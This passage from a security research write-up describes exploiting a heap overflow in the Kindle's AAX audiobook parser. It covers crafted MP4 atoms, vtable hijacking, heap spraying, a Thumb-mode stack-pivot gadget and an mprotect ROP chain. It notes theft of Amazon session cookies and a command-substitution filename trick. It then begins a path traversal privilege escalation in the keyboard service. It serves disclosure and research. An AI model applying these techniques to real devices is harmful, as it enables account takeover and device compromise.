</span></span><span style=display:flex><span>      <span style=color:#75715e>/* Fill content info */</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    k<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>It will first fetch the image count, then allocate some arrays to store information about each image, and then call <code>AAXGetImageInfo</code> on each image. This latter API calls <code>GetFrameInfoMPEG4</code> with the argument <code>'jpeg'</code>: this is where lives the vulnerable code.</p><p><a href=/posts/img/kindle/mp4-trigger-dark.png target=_blank><img src=/posts/img/kindle/mp4-trigger-dark.png alt="Code path to trigger the AAX vulnerability"></a></p><p>In order to reach <code>AAXGetImageInfo</code>, we need to edit an AAX file to contain an image entry, so that <code>AAXGetImageCount</code> returns a non-zero image count. We started from a sample AAX file found on the internet (those are very scarce!) and added a JPEG entry in the following atom path:</p><img src=/posts/img/kindle/mp4-stsd-dark.png alt="Path in MP4 file to reach stsd" width=60%><p>It seems that these atoms are linked to an arcane feature initially developed by Apple, <em>enhanced podcasts</em>, which adds support for chapter thumbnails to be rendered along the audio.</p><p>Since well-known tools such as <a href=https://www.ffmpeg.org/>FFmpeg</a> will not support editing AAX files, we instead turned to this <a href=https://github.com/beardypig/pymp4>pymp4 library</a> based on Construct.</p><p>pymp4 did not work out-of-the-box with our sample AAX file either, but we patched it and added some definitions to support a few non-standard elements. Notably, there were incoherences with the definition of some atoms such as handler reference boxes, data entry boxes or user data boxes, and the overall handling of strings that seems to go against the MPEG-4 standard.</p><p>Then, we could basically locate the <code>stsd</code> atom from the right track and add a new JPEG entry:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>stsd_atom<span style=color:#f92672>.</span>data<span style=color:#f92672>.</span>entries<span style=color:#f92672>.</span>insert(<span style=color:#ae81ff>0</span>, {
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;format&#34;</span>: <span style=color:#e6db74>&#34;jpeg&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;data_reference_index&#34;</span>: <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;data&#34;</span>: <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00\x00\x00\x00</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><p>Triggering the bug is now a matter of manually patching an <code>stsc</code> atom to contain a bogus size:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-plain data-lang=plain><span style=display:flex><span>00 00 00 1C  ; atom size
</span></span><span style=display:flex><span>73 74 73 63  ; &#39;stsc&#39;
</span></span><span style=display:flex><span>00 00 00 00
</span></span><span style=display:flex;background-color:#3c3d38><span>15 55 55 56  ; n_entries
</span></span><span style=display:flex><span>[...]        ; entries data</span></span></code></pre></div><p>This is enough to make the <code>scanner</code> process crash, as the whole heap was overwritten with garbage.</p><h2 id=exploitation>Exploitation</h2><p>The first obstacle that we face here is that the write loop will basically go on forever (since it will count up to <code>0x15555556</code>), unless there&rsquo;s a crash or an early exit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>buf <span style=color:#f92672>=</span> <span style=color:#a6e22e>OAAmalloc</span>(<span style=color:#ae81ff>12</span> <span style=color:#f92672>*</span> n_entries);
</span></span><span style=display:flex><span>k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> ( k <span style=color:#f92672>&lt;</span> n_entries ) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>read_dword_big_endian</span>(input_stream, <span style=color:#f92672>&amp;</span>v53)) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>read_dword_big_endian</span>(input_stream, <span style=color:#f92672>&amp;</span>v54)) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>read_dword_big_endian</span>(input_stream, <span style=color:#f92672>&amp;</span>v55)) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  buf <span style=color:#f92672>+=</span> <span style=color:#ae81ff>12</span>;
</span></span><span style=display:flex><span>  k<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(buf <span style=color:#f92672>-</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>=</span> v53;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(buf <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>=</span> v54;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(buf <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>=</span> v55;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We may be able to force an early exit if <code>read_dword_big_endian</code> reaches EOF and returns an error. This would require reorganizing the tree structure of the file to put the <code>stsc</code> atom at the very end.</p><p>But before digging any further in this direction, we should first trigger the bug on a real Kindle to see exactly where it crashes and if there&rsquo;s an unforeseen, favorable context for exploitation.</p><p>We observed that when triggering the bug with our QEMU user setup, the process always crashed because it reached the end of the heap. However, on an actual device, the reality was much different: the crash happened in the middle of the loop, inside <code>read_dword_big_endian</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>read_dword_big_endian</span>(IStdioInputStream <span style=color:#f92672>*</span>this, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>out) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint8_t</span> buf[<span style=color:#ae81ff>4</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> read_size;
</span></span><span style=display:flex;background-color:#3c3d38><span>  <span style=color:#66d9ef>int</span> result <span style=color:#f92672>=</span> this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>OAARead</span>(this, buf, <span style=color:#ae81ff>4</span>, <span style=color:#f92672>&amp;</span>read_size);  <span style=color:#75715e>// crash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>result) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> value <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>      value <span style=color:#f92672>=</span> buf[i] <span style=color:#f92672>|</span> (value <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>out <span style=color:#f92672>=</span> value;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>More specifically, it crashed because it failed to dereference <code>r0</code> during the virtual call to <code>OAARead</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-coffeescript data-lang=coffeescript><span style=display:flex><span><span style=color:#a6e22e>ldr</span> <span style=color:#a6e22e>r3</span>, [<span style=color:#a6e22e>r0</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>ldr</span> <span style=color:#a6e22e>r12</span>, [<span style=color:#a6e22e>r3</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>]
</span></span><span style=display:flex><span><span style=color:#a6e22e>blx</span> <span style=color:#a6e22e>r12</span></span></span></code></pre></div><p>What happened here is that with our heap overflow, we managed to <strong>overwrite a vtable pointer</strong>. But as luck would have it, we haven&rsquo;t hijacked just <em>any</em> vtable pointer: we are overflowing on the <code>IStdioInputStream</code> object, which is the abstraction used to read from the file.</p><p>The exploitation context suddenly becomes very favorable: we overwrite a vtable pointer, and right after, in the next loop iteration, this vtable pointer is used to call the <code>OAARead</code> method. This means that if we can craft a fake vtable and predict its address, <strong>we can redirect control flow</strong>.</p><p>Experimentally, we observe that the offset in the file at which we overwrite the vtable pointer is not too far from the <code>stsc</code> atom (e.g. <code>+0x130</code>), and although there is some heap non-determinism that can change it a little, it is definitely workable without having to resort to spraying.</p><p><a href=/posts/img/kindle/heap-overflow-vtable-dark.png target=_blank><img src=/posts/img/kindle/heap-overflow-vtable-dark.png alt></a></p><p>Now, as you may have guessed, the hard part in this plan is <em>predicting the address</em>.</p><p>Since there is no obvious way of knowing an address to data we control, we could first try looking for suitable &ldquo;vtable&rdquo; gadgets (the address of an address that itself points to a gadget).</p><p>The only address range that is reasonably certain is the one of the <code>scanner</code> binary as it lacks PIE. Unfortunately, the <code>scanner</code> binary is very small (9 KB) and does not contain any pertinent gadgets, even less so &ldquo;vtable&rdquo; gadgets.</p><p>After spending a lot of time trying to figure it out, we came to the conclusion that turning such an indirect call primitive into arbitrary code execution in one shot and without any ASLR leak would be very hard, if not impossible.</p><p>Ultimately, we are dealing with an arm32 target: entropy is a bit weak in certain parts of the virtual address space, especially in the &ldquo;mmap&rdquo; region where shared libraries are loaded.</p><p>We can therefore reasonably <strong>make a hypothesis on library addresses</strong>, especially because after a crash, the <code>scanner</code> process will automatically restart and parse our file again: we can just wait until we reach a configuration where our hypothesis is correct.</p><p>Still, it would be more comfortable to know an address to data we control at some point (be it for shellcoding, ropping, hardcoding strings&mldr;), and we won&rsquo;t easily find that in library data sections.</p><p><strong>The technique we used here is to leverage a huge allocation</strong>. When an allocation exceeds <code>DEFAULT_MMAP_THRESHOLD</code> (here <code>0x20000</code> bytes), glibc will call <code>mmap</code> instead of using the main arena. This will place the allocated chunk near the libraries, effectively reducing its address entropy.</p><p>We could then use this allocation to store a fake vtable and a potential ROP chain or shellcode. To this end, we need a nice allocation primitive, in which we control both size and contents.</p><p>We found such a primitive during the parsing of the <code>'@car'</code> metadata:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>AAXGetMetadataInfo</span>(ctx, <span style=color:#960050;background-color:#1e0010>&#39;@</span>car<span style=color:#960050;background-color:#1e0010>&#39;</span>, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>content_info<span style=color:#f92672>-&gt;</span>meta_covertag_size);
</span></span><span style=display:flex><span>cover <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(content_info<span style=color:#f92672>-&gt;</span>meta_covertag_size);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (cover) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>AAXGetMetadata</span>(ctx, <span style=color:#960050;background-color:#1e0010>&#39;@</span>car<span style=color:#960050;background-color:#1e0010>&#39;</span>, cover, content_info<span style=color:#f92672>-&gt;</span>meta_covertag_size);
</span></span><span style=display:flex><span>  content_info<span style=color:#f92672>-&gt;</span>meta_covertag <span style=color:#f92672>=</span> cover;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The <code>'@car'</code> metadata field stores the cover image for the audiobook. The contents of the cover are read from the file and copied to the allocated buffer by <code>AAXGetMetadata</code>. They do make sure the cover is a valid image, but we can easily add arbitrary data at the end of a JPEG file.</p><p>Metadata are found in the <em>user data</em> atom (<code>udta</code>). We can reach the cover through this path:</p><img src=/posts/img/kindle/mp4-covr-dark.png alt="Path to cover atom" width=70%><p>We can programmatically add some data at the end of this atom&rsquo;s contents to make it huge:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>covr_data_atom <span style=color:#f92672>=</span> find_atom(find_atom(find_atom(find_atom(find_atom(
</span></span><span style=display:flex><span>                    containers, <span style=color:#e6db74>&#39;moov&#39;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#f92672>.</span>data<span style=color:#f92672>.</span>children, <span style=color:#e6db74>&#39;udta&#39;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#f92672>.</span>data<span style=color:#f92672>.</span>children, <span style=color:#e6db74>&#39;meta&#39;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#f92672>.</span>data<span style=color:#f92672>.</span>children, <span style=color:#e6db74>&#39;ilst&#39;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#f92672>.</span>data<span style=color:#f92672>.</span>children, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;covr&#39;</span>)<span style=color:#f92672>.</span>value
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>covr_data_atom<span style=color:#f92672>.</span>data<span style=color:#f92672>.</span>data <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x400000</span>
</span></span></code></pre></div><p>At the time of the crash, we do verify through <code>/proc/&lt;pid>/maps</code> that our cover was effectively mmapped on top of the shared libraries:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-plain data-lang=plain><span style=display:flex><span>[root@kindle us]# cat /proc/4882/maps
</span></span><span style=display:flex><span>00008000-0000a000 r-xp 00000000 fc:08 568        /usr/bin/scanner
</span></span><span style=display:flex><span>00011000-00012000 rw-p 00001000 fc:08 568        /usr/bin/scanner
</span></span><span style=display:flex><span>01e9c000-01efc000 rw-p 00000000 00:00 0          [heap]
</span></span><span style=display:flex;background-color:#3c3d38><span>b5895000-b5ca4000 rw-p 00000000 00:00 0
</span></span><span style=display:flex><span>b5ca4000-b5dcc000 r-xp 00000000 fc:08 24218      /usr/lib/libfreetype.so.6.16.0
</span></span><span style=display:flex><span>b5dcc000-b5dd0000 rw-p 00128000 fc:08 24218      /usr/lib/libfreetype.so.6.16.0
</span></span><span style=display:flex><span>b5dd0000-b5dd4000 r-xp 00000000 fc:08 553        /usr/lib/libXdmcp.so.6.0.0
</span></span><span style=display:flex><span>b5dd4000-b5ddb000 ---p 00004000 fc:08 553        /usr/lib/libXdmcp.so.6.0.0
</span></span><span style=display:flex><span>b5ddb000-b5ddc000 rw-p 00003000 fc:08 553        /usr/lib/libXdmcp.so.6.0.0
</span></span><span style=display:flex><span>[...]</span></span></code></pre></div><p>Now, although we could make an assumption about the address of our allocation, we noted that empirically, the activity of other threads could slightly get in the way and make predictions a little bit unreliable. The scanner&rsquo;s state can also have an impact, as extractor libraries are usually loaded dynamically when needed.</p><p>In order to achieve control flow hijacking with near-perfect reliability, we decided to spray the fake vtable across several megabytes of pages:</p><p><a href=/posts/img/kindle/mp4-exploit-1-dark.png target=_blank><img src=/posts/img/kindle/mp4-exploit-1-dark.png alt="Spraying fake vtables"></a></p><p>The idea is to first pad the cover chunk to reach page alignment, and then spray âˆ³Nâˆ³ pages of fake vtables. We choose to target the fake vtable at index âˆ³Gâˆ³, somewhere in the middle, which address is âˆ³v_Gâˆ³ (the optimal index most likely depends on some probabilistic distribution linked to the address entropy, but we won&rsquo;t go as far as that).</p><p>Now let&rsquo;s assume we have overwritten <code>IStdioInputStream</code>&rsquo;s vtable pointer with âˆ³v_Gâˆ³, and we want to redirect the control flow to a shellcode of ours that we put right after the JPEG. The address of the target method in the fake vtable, âˆ³m_Gâˆ³, must be defined as:</p><p>âˆ³âˆ³m_G = v_G - \text{0x1000} \times G - \text{padded_shellcode_size}âˆ³âˆ³</p><p>If we want to be able to jump on our shellcode no matter which fake vtable we landed on, we must extend this definition to all the target methods âˆ³m_kâˆ³, for each vtable we spray:</p><p>âˆ³âˆ³\forall k \in [[0, \:N-1]], \: m_k = v_k - \text{0x1000} \times k - \text{padded_shellcode_size}âˆ³âˆ³</p><p>This describes how to fill each vtable we spray, and therefore what we should put inside the cover data. This approach allows us <strong>to hit our shellcode quite reliably</strong> regardless of ASLR (with a big enough âˆ³Nâˆ³, such as 1024).</p><p>Now, the obvious issue here is that the shellcode is not executable. Initially, we wrote the exploit for an older Kindle (2019) on which all allocations were RWX, so this approach was sufficient. But on more modern Kindle devices, W^X mitigates this, so we need to find another way.</p><p>Our first idea for a &ldquo;quick win&rdquo; was to call <code>system</code>. Indeed, at the moment of the indirect call, <code>r0</code> points to the <code>IStdioInputStream</code> chunk which has the following layout:</p><pre tabindex=0><code>[(hijacked) vtable pointer]
[some 4-byte field]
[aax file path]
</code></pre><p>Hence, if we rename our AAX file to contain a command substitution, e.g. <code>$(subcommand).aax</code>, it could end up calling <code>system("&lt;garbage>/mnt/us/audible/$(subcommand).aax")</code>. This would first run our subcommand, and then try to execute the prefixing garbage (and fail, but we don&rsquo;t care).</p><p>Unfortunately, calling <code>system</code> just crashes everything, presumably because it relies on heap allocations and the heap is now in shambles. We would be better off performing ROP/JOP with only pure syscalls and zero heap operation on the way.</p><p>Executing a ROP chain without any prior stack pivot is probably a lost cause, so the first gadget we want to find is one that makes <code>sp</code> point to controlled data. Options for such a gadget are scarce, but hope springs eternal.</p><p>At the moment of the indirect call, it so happens that <code>r8</code> points to the start of the buffer that was just allocated (the one that was subject to the heap overflow), where controlled data from the file was copied. Now we &ldquo;only&rdquo; need to find a gadget that <strong>pivots the stack to <code>r8</code></strong>.</p><img src=/posts/img/kindle/heap-control-r8-dark.png alt="Heap layout and r8" width=40%><p>Finding such a gadget was not trivial: we not only needed to set <code>sp</code>, but also to keep hold of <code>pc</code>. It became much easier knowing this one simple trick documented in a previous Thalium blog post (<a href=/posts/pivoting_to_the_secure_world/>ARM TrustZone: pivoting to the secure world</a>).</p><p>The ARM instruction set consists of 4-byte instructions. However, one can switch to another mode, called <em>Thumb mode</em>, by jumping to an address with LSB set to 1. This mode relies on the <strong>Thumb-2 instruction set extension</strong>, in which instructions are 2-byte aligned and are either 16-bit or 32-bit long, allowing for higher code density.</p><p>Naturally, this also means a higher density of gadgets, and a rather powerful type of gadget that can be found when decoding instructions as Thumb-2 are these LDM gadgets:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-coffeescript data-lang=coffeescript><span style=display:flex><span><span style=color:#a6e22e>ldm</span>.<span style=color:#a6e22e>w</span> <span style=color:#a6e22e>Rn</span>[<span style=color:#f92672>!</span>], {<span style=color:#a6e22e>registers</span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>ldmdb</span> <span style=color:#a6e22e>Rn</span>[<span style=color:#f92672>!</span>], {<span style=color:#a6e22e>registers</span>}
</span></span></code></pre></div><p>They allow to pop a whole set of registers relatively from where the source register (<code>Rn</code>) points to in memory. We find the perfect gadget for our use case, of all places, inside <code>libsqlite3.so</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-coffeescript data-lang=coffeescript><span style=display:flex><span><span style=color:#a6e22e>ldm</span>.<span style=color:#a6e22e>w</span> <span style=color:#a6e22e>r8</span><span style=color:#f92672>!</span>, {<span style=color:#a6e22e>r0</span>, <span style=color:#a6e22e>r1</span>, <span style=color:#a6e22e>r2</span>, <span style=color:#a6e22e>r3</span>, <span style=color:#a6e22e>r4</span>, <span style=color:#a6e22e>r5</span>, <span style=color:#a6e22e>r6</span>, <span style=color:#a6e22e>r7</span>, <span style=color:#a6e22e>r8</span>, <span style=color:#a6e22e>sb</span>, <span style=color:#a6e22e>fp</span>, <span style=color:#a6e22e>sp</span>, <span style=color:#a6e22e>lr</span>, <span style=color:#a6e22e>pc</span>}  ; <span style=color:#ae81ff>0x21a84</span>
</span></span></code></pre></div><p>This one will set all these registers according to the data which <code>r8</code> points to, and that we control. By jumping to <code>libsqlite3 + 0x21a85</code>, we can switch to Thumb mode and control both <code>sp</code> and <code>pc</code>.</p><p>Interestingly, well-known tools such as <a href=https://github.com/JonathanSalwan/ROPgadget>ROPgadget</a> did not output these gadgets in Thumb mode. We made a pull request to add LDM patterns for JOP gadgets with the <code>--thumb</code> option, which has been merged in ROPgadget 7.6.</p><p>Even more interestingly, these gadgets are not supposed to be valid. The <a href=https://developer.arm.com/documentation/ddi0406/latest/>ARMv7-A specification</a> states about LDM instructions that, in Thumb mode:</p><ul><li><code>sp</code> <em>cannot</em> be in the register list;</li><li><code>pc</code> and <code>lr</code> cannot be both in the register list at the same time.</li></ul><p>Yet, these instructions still somehow run on the Kindle&rsquo;s Cortex-A7 CPU!</p><p>Now we are able to execute an arbitrary ROP chain in the context of the <code>scanner</code> process, as long as we know where exactly to pivot the stack to â€” which we can simply address by spraying our ROP chain along our fake vtables, in a parallel fashion.</p><p>We chose to finalize the exploit by leveraging a classic <code>__libc_csu_init</code> gadget in <code>scanner</code> itself (probably the only useful gadget in this tiny binary). It allows to perform a controlled function call:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-coffeescript data-lang=coffeescript><span style=display:flex><span><span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>r0</span>, <span style=color:#a6e22e>r7</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>r1</span>, <span style=color:#a6e22e>r8</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> <span style=color:#a6e22e>r2</span>, <span style=color:#a6e22e>r9</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>blx</span> <span style=color:#a6e22e>r3</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>cmp</span> <span style=color:#a6e22e>r4</span>, <span style=color:#a6e22e>r6</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>bne</span> <span style=color:#ae81ff>0x9634</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>pop</span> {<span style=color:#a6e22e>r3</span>, <span style=color:#a6e22e>r4</span>, <span style=color:#a6e22e>r5</span>, <span style=color:#a6e22e>r6</span>, <span style=color:#a6e22e>r7</span>, <span style=color:#a6e22e>r8</span>, <span style=color:#a6e22e>r9</span>, <span style=color:#a6e22e>pc</span>}
</span></span></code></pre></div><p>This way, we can call <code>mprotect</code> to make our shellcode RWX, and finally jump on it.</p><p>Here is a diagram that summarizes the exploit:</p><p><a href=/posts/img/kindle/mp4-exploit-2-dark.png target=_blank><img src=/posts/img/kindle/mp4-exploit-2-dark.png alt="Summary of the AAX heap overflow exploit"></a></p><p>The biggest caveat of this exploit is that the libc base address needs to be hardcoded (or libsqlite3, but the offset between the two seems to be constant, at least empirically). We believe its entropy is approximately 9 bits, which is quite reasonable.</p><p>Combined with the fact that the heap overflow sometimes fails (due to heap non-determinism, for instance the target chunk to overwrite may not always be located after the overflow chunk), we estimate the exploit to hit with around 1/1024 probability.</p><p>This low success rate is <strong>still workable in a real exploitation scenario</strong> because the scanner will crash silently, restart automatically, and scan the AAX file on a loop. It can repeat this process in the background for as long as needed without the user ever noticing.</p><p>A downside is that the scanner process may take a whole minute to restart, which can make the exploitation very slow (e.g. 10 hours). This is still totally fine for an attacker, as the exploit runs silently in the background and Kindle e-readers usually stay powered on for many days.</p><p>Once we are able to execute a shellcode, <strong>we can run a second stage as the <code>framework</code> user</strong>.</p><p>Although everything could happen in-process, we chose, for convenience, to simply drop an <code>.sh</code> file in <code>/mnt/us/</code>. This folder is not executable by default so <code>execve("/mnt/us/stage2.sh", 0, 0)</code> won&rsquo;t work off the bat, but we can run <code>execve("bash", ["bash", "/mnt/us/stage2.sh"], 0)</code> instead.</p><p>As the <code>framework</code> user, we can basically already steal crucial Amazon session cookies, found in <code>/var/local/mesquite/store/cookieJar</code>. This is enough to take over a victim&rsquo;s Amazon account.</p><p>But we won&rsquo;t stop there: let&rsquo;s try to find an additional privilege escalation to become <code>root</code>!</p><h1 id=vuln-2-path-traversal-in-the-keyboard-service>Vuln #2: path traversal in the keyboard service</h1><p>Our first intuition for a local privilege escalation was to turn to LIPC services running as root. As we saw earlier, enumerating local LIPC services and the properties they expose is as easy as running <code>lipc-probe -a -v</code>.</p><p>The <code>com.lab126.keyboard</code> service, which is run by the <code>kb</code> process, caught our attention:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-plain data-lang=plain><span style=display:flex><span>com.lab126.keyboard
</span></span><span style=display:flex><span>        r       Int     lang    [0]
</span></span><span style=display:flex><span>        r       Int     height  [275]
</span></span><span style=display:flex><span>        rw      Int     dumpWidget      [0]
</span></span><span style=display:flex><span>        r       Int     id      [0]
</span></span><span style=display:flex><span>        r       Str     preedit []
</span></span><span style=display:flex><span>        rw      Has     uiQueryHash     [*NOT SHOWN*]
</span></span><span style=display:flex><span>        r       Int     web     [0]
</span></span><span style=display:flex><span>        r       Int     flags   [0]
</span></span><span style=display:flex><span>        r       Str     rescan  [/var/local/system/keyboard.conf]
</span></span><span style=display:flex><span>        rw      Str     language        [en_GB]
</span></span><span style=display:flex><span>        r       Str     appID   []
</span></span><span style=display:flex;background-color:#3c3d38><span>        rw      Str     languages       [en_GB]
</span></span><span style=display:flex><span>        rw      Str     logLevel        [...]
</span></span><span style=display:flex><span>        w       Str     setSurround
</span></span><span style=display:flex><span>        r       Str     bounds  [0:525:600:275]
</span></span><span style=display:flex><span>        rw      Str     logMask [0x0fff0000]
</span></span><span style=display:flex><span>        w       Str     open
</span></span><span style=display:flex><span>        r       Int     show    [0]
</span></span><span style=display:flex><span>        w       Str     close
</span></span><span style=display:flex><span>        r       Int     diacriticalId   [0]
</span></span><span style=display:flex><span>        r       Str     keyboard_language       [en-GB]
</span></span><span style=display:flex><span>        rw      Str     largeFont       []</span></span></code></pre></div><p>We analyzed <code>/usr/lib/libkb.so</code>, the library that the keyboard process depends on, and very promptly found an interesting piece of code inside the setter handler for the <code>languages</code> property:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> (
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>_snprintf_chk</span>(
</span></span><span style=display:flex><span>    path, <span style=color:#ae81ff>4096</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4096</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/usr/share/keyboard/%s/%s-%dx%d.keymap.gz&#34;</span>,
</span></span><span style=display:flex><span>    lang, lang, res_w, res_h
</span></span><span style=display:flex><span>  ) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4096</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>access</span>(path, <span style=color:#ae81ff>0</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((g_lab126_log_mask <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x2000000</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>_syslog_chk</span>(<span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;E def:kb:filename=%s, error=%d:the file does not exist&#34;</span>, path, err);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>The <code>languages</code> property is a list of language identifiers, separated by colons (<code>:</code>). Each language is deemed valid as long as an associated keymap file exists. However, <strong>path traversal</strong> can be leveraged to point to a controlled keymap outside of the <code>/usr/share/keyboard/</code> folder.</p><p>For instance, by setting the <code>languages</code> property to <code>en_GB:../../../mnt/us/documents</code>, the service will check that the following file exists:</p><pre tabindex=0><code>/usr/share/keyboard/../../../mnt/us/documents/../../../mnt/us/documents-1072x1448.keymap.gz
</code></pre><p>Note that the display resolution, here <code>1072x1448</code>, may be device-specific.</p><p>This path first simplifies to:</p><pre tabindex=0><code>/mnt/us/documents/../../../mnt/us/documents-1072x1448.keymap.gz
</code></pre><p>Since the <code>documents</code> folder does exist, the path finally resolves to:</p><pre tabindex=0><code>/mnt/us/documents-1072x1448.keymap.gz
